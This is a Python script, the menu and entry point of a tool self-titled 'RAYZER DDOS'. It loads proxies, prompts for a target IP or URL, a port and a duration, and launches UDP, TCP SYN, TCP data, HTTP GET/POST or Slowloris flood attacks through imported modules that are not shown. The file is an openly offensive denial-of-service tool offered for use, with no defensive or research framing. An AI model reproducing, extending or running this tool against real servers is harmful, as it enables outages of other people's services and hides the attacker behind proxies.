# CODDED BY RAYZER
# By Rayzer
from utils.colors import color, set_title
from utils.validate import validate_input
from utils.proxy import load_proxies
from methods.udp import udp_plain_flood, udp_random_flood
from methods.tcp import (
    tcp_syn_flood_single, tcp_syn_flood_multi,
    tcp_data_flood_single, tcp_data_flood_multi
)
from methods.http import http_flood
from methods.slowloris import slowloris_attack
from utils.banner import banner
from utils.clear import clear
from utils.creds import creds

# By Rayzer
def main():
    set_title("RAYZER DDOS")
    load_proxies()  # Proxy
    banner() # Banner
    creds() # Creds

    print(color("Violet Ddos\n", "purple"))
    print("Methods:")
    print("1. UDP")
    print("2. TCP")
    print("3. HTTP")
    print("4. Slowloris")

    protocol = input(color("Select protocol: ", "blue")).strip()

    if protocol == "1":  # UDP
        print(color("\nUDP Methods:", "blue"))
        print("1. UDP Plain (Fixed payload)")
        print("2. UDP Random (Random payload)")
        method = input(color("Select method (1-2): ", "blue")).strip()

        ip = input(color("Enter server IP: ", "blue"))
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
        packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)

        if method == "1":
            udp_plain_flood(ip, port, duration, packet_size)
        elif method == "2":
            udp_random_flood(ip, port, duration, packet_size)
        else:
            print(color("[!] Invalid UDP method.", "red"))

    elif protocol == "2":  # TCP
        print(color("\nTCP Methods:", "blue"))
        print("1. TCP SYN Flood")
        print("2. TCP Data Flood")
        method = input(color("Select method (1-2): ", "blue")).strip()

        ip = input(color("Enter server IP: ", "blue"))
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)

        print(color("Execution Style:", "blue"))
        print("1. Single Socket")
        print("2. Multi-threaded (10 threads)")
        style = input(color("Select style (1-2): ", "blue")).strip()

        if method == "1":
            if style == "1":
                tcp_syn_flood_single(ip, port, duration)
            elif style == "2":
                tcp_syn_flood_multi(ip, port, duration)
            else:
                print(color("[!] Invalid TCP SYN style.", "red"))
        elif method == "2":
            packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
            if style == "1":
                tcp_data_flood_single(ip, port, duration, packet_size)
            elif style == "2":
                tcp_data_flood_multi(ip, port, duration, packet_size)
            else:
                print(color("[!] Invalid TCP Data style.", "red"))
        else:
            print(color("[!] Invalid TCP method.", "red"))

    elif protocol == "3":  # HTTP
        print(color("\nHTTP Methods:", "blue"))
        print("1. GET Flood")
        print("2. POST Flood")
        method = input(color("Select method (1-2): ", "blue")).strip()

        url = input(color("Enter URL (e.g., http://example.com): ", "blue"))
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)

        use_post = (method == "2")
        http_flood(url, duration, use_post)

    elif protocol == "4":  # Slowloris
        ip = input(color("Enter target IP: ", "blue"))
        port = validate_input("Enter target port (e.g. 80): ", 1, 65535)
        duration = validate_input("Enter attack duration in seconds: ", 1, float('inf'), float)
        slowloris_attack(ip, port, duration)

    else:
        print(color("[!] Invalid protocol selected.", "red"))

# By Rayzer
if __name__ == "__main__":
    main()
